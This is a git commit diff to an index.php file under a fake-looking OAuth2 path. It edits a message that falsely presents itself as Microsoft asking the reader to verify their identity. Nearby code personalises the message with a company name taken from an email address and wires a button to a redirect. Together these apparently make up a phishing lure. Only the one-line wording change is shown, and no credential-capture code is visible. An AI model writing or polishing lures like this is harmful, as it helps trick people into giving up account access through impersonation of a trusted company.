269186fe4f340a52240b70b2f17f8f923b1e6b43
wick3dhub <130564370+wick3dhub@users.noreply.github.com>
2025-03-28 16:51:48 +0000

    Update index.php

--- oauth2/10755041/2394713/media/1b298070f81874a146234ae0247ad45/index.php
+++ oauth2/10755041/2394713/media/1b298070f81874a146234ae0247ad45/index.php
@@ -28,7 +28,7 @@
                 document.getElementById('message').innerHTML = `To access ${companyName} organization's data, Microsoft needs to verify it's you.`;
             } else {
                 // If no email found, show the default message
-                document.getElementById('message').innerHTML = "To access your organization's data, Microsoft needs to verify it's you.";
+                document.getElementById('message').innerHTML = "To access this organization's data, Microsoft needs to verify it's you.";
             }
 
             // Set up the button click handler for redirection
